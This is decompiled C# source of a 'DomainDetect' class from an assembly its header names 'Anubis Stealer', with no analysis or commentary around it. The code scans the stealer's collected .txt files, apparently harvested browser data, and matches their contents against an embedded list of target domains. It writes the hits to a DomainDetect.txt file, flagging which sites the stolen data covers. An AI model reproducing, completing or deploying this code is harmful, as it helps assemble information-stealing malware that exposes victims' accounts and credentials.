// Decompiled with JetBrains decompiler
// Type: Anubis.DomainDetect
// Assembly: Anubis Stealer, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4CC1199D-65A9-4D34-AA4B-98216B1632A3
// Assembly location: C:\Users\Administrator\Downloads\Build.exe

using Saruman;
using Saruman.Properties;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Anubis
{
    public class DomainDetect
  {
    public static void Start(string Browser)
    {
      try
      {
        Encoding utF8 = Encoding.UTF8;
        List<string> list = ((IEnumerable<string>) Resources.Domains.Split()).Select<string, string>((Func<string, string>) (w => w.Trim())).Where<string>((Func<string, bool>) (w => w != "")).Select<string, string>((Func<string, string>) (w => w.ToLower())).ToList<string>();
        FileInfo[] files = new DirectoryInfo(Program.dir).GetFiles("*.txt", SearchOption.AllDirectories);
        List<string> stringList = new List<string>();
        foreach (FileInfo fileInfo in files)
        {
          stringList.AddRange((IEnumerable<string>) File.ReadAllLines(fileInfo.FullName, utF8));
          Console.WriteLine(fileInfo.FullName);
        }
        HashSet<string> stringSet1 = new HashSet<string>();
        foreach (string str1 in stringList)
        {
          foreach (string str2 in ((IEnumerable<string>) str1.Split()).Select<string, string>((Func<string, string>) (w => w.Trim())).Where<string>((Func<string, bool>) (w => w != "")).Select<string, string>((Func<string, string>) (w => w.ToLower())).ToList<string>())
          {
            if (!stringSet1.Contains(str2))
              stringSet1.Add(str2);
          }
        }
        HashSet<string> stringSet2 = new HashSet<string>();
        foreach (string str1 in list)
        {
          foreach (string str2 in stringSet1)
          {
            if (str2.Contains(str1) && !stringSet2.Contains(str1))
              stringSet2.Add(str1);
          }
        }
        File.WriteAllLines(Browser + "\\DomainDetect.txt", (IEnumerable<string>) stringSet2, Encoding.Default);
        string.Join(", ", (IEnumerable<string>) stringSet2);
      }
      catch
      {
      }
    }
  }
}
